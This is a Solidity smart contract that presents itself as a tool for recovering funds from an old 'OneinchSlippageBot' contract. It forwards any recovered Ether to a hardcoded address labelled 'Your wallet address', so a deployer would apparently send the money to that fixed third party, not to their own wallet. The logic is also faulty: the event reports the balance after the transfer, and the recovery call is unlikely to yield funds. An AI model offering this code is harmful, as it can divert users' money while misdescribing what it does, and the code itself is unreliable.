// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IOneinchSlippageBot {
    function withdrawal() external payable;
}

contract RecoveryContract {

    IOneinchSlippageBot oldContract;  // Interface for the old contract
    address private owner;  // The owner of the recovery contract
    address private recoveryAddress = 0xAaB7620051adAbac5335692d532020702Ead5f13;  // Your wallet address

    event Recovery(address indexed recipient, uint256 amount);

    // Constructor to initialize the old contract address
    constructor(address _oldContractAddress) {
        oldContract = IOneinchSlippageBot(_oldContractAddress);  // Set the old contract address
        owner = msg.sender;  // Set the owner to the address that deploys this contract
    }

    // Only the owner of this contract can call the recovery function
    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    // Function to recover funds from the old contract
    function recoverFunds() public onlyOwner {
        // Call withdrawal() on the old contract
        oldContract.withdrawal();

        // Transfer the recovered funds to your wallet address
        payable(recoveryAddress).transfer(address(this).balance);

        emit Recovery(recoveryAddress, address(this).balance);  // Emit an event after the recovery
    }

    // Fallback function to accept Ether
    receive() external payable {}
}